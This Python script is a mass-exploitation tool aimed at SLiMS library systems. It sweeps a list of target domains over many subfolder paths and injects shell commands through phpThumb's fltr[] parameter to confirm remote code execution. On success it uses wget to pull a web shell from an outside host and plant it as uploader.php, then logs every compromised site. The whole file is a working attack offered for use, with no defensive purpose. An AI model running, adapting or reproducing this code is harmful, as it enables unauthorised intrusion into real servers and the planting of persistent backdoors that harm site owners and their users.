#!/usr/bin/env python3
import requests
import warnings
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

# --- SILENCE ---
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

# Style Palette (Fixed Unpack Error)
GREEN, RED, YELLOW, CYAN, WHITE, RESET, BOLD = '\033[92m', '\033[91m', '\033[93m', '\033[96m', '\033[97m', '\033[0m', '\033[1m'

class SlimsAutoPwn:
    def __init__(self):
        # Header MacBook Pro environment
        self.headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"}
        self.shell_raw = "https://shell.prinsh.com/Nathan/marijuana.txt"
        self.shell_name = "uploader.php"
        
        # VALIDATION KEY: Sesuai uploader
        self.val_key = 'name="__"'

        # Penanganan Path Dinamis (Cendana, Kampus, dsb)
        self.sub_folders = [
            "",                       # Root
            "/slims7_cendana",        # Versi Cendana Default
            "/cendana",               # Versi Cendana Renamed
            "/perpustakaan",          # Standar
            "/pustaka", "/digilib",   # Varian kampus
            "/slims", "/library",     # Umum
            "/v7", "/v8", "/v9",      # Versi Spesifik
            "/senayan", "/admin"      # Engine asli & Admin path
        ]
        self.vuln_path = "/lib/watermark/phpThumb.php"

    def pwn(self, url, pbar):
        raw_url = url.strip().replace('http://', '').replace('https://', '').rstrip('/')
        protocols = ['https://', 'http://']
        
        for proto in protocols:
            current_base = f"{proto}{raw_url}"
            for folder in self.sub_folders:
                target_url = f"{current_base}{folder}{self.vuln_path}"
                
                # 1. TEST RCE (Dapet output echo gak?)
                verify_str = "PYRE_VERIFIED"
                params_check = {"src": "1.jpg", "fltr[]": f"blur|9 ;echo {verify_str};", "phpThumbDebug": "9"}

                try:
                    # allow_redirects=False biar gak lari ke hal login
                    r_check = requests.get(target_url, params=params_check, headers=self.headers, verify=False, timeout=10, allow_redirects=False)
                    
                    if verify_str in r_check.text:
                        # 2. EKSEKUSI UPLOAD (Pake wget)
                        # Ditambah --no-check-certificate biar aman
                        upload_payload = f"blur|9 ;wget -q --no-check-certificate {self.shell_raw} -O {self.shell_name};"
                        params_upload = {"src": "1.jpg", "fltr[]": upload_payload, "phpThumbDebug": "9"}
                        requests.get(target_url, params=params_upload, headers=self.headers, verify=False, timeout=20, allow_redirects=False)
                        
                        # 3. STRICT CONTENT VERIFICATION
                        # Path shell ngikutin folder suksesnya phpThumb
                        shell_path = target_url.replace("phpThumb.php", self.shell_name)
                        r_shell = requests.get(shell_path, headers=self.headers, verify=False, timeout=10, allow_redirects=False)
                        
                        # Syarat: Status 200 DAN ada keyword uploader
                        if r_shell.status_code == 200 and self.val_key in r_shell.text:
                            pbar.write(f"{GREEN}{BOLD}[REAL JACKPOT] {shell_path}{RESET}")
                            with open("pwn_results.txt", "a") as f:
                                f.write(f"{shell_path}\n")
                            return True # Satu vuln per domain
                except:
                    continue
        return False

def main():
    import argparse
    parser = argparse.ArgumentParser(description="SLiMS Mass Exploit")
    parser.add_argument("-l", "--list", required=True, help="Target list")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Threads")
    args = parser.parse_args()

    if not os.path.exists(args.list):
        print(f"{RED}[!] List not found!{RESET}")
        return

    with open(args.list, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]

    print(f"\n{BOLD}{CYAN}[*] SLiMS Mass Pwn V4 - Multi-Path & Precision{RESET}")
    print(f"{CYAN}[*] Mode: Multi-Folder Auto Discovery (Cendana Ready){RESET}")
    print(f"{CYAN}[*] Target Domains: {len(urls)} | Sub-Folders: {len(SlimsAutoPwn().sub_folders)}{RESET}\n")

    pwner = SlimsAutoPwn()

    with tqdm(total=len(urls), desc="Hunting", unit="url", bar_format="{l_bar}{bar:30}{r_bar}") as pbar:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = [executor.submit(pwner.pwn, url, pbar) for url in urls]
            for _ in as_completed(futures):
                pbar.update(1)

    print(f"\n{GREEN}{BOLD}[+] Task Finished. Real shells saved in pwn_results.txt. 🍦🚀{RESET}")

if __name__ == "__main__":
    main()
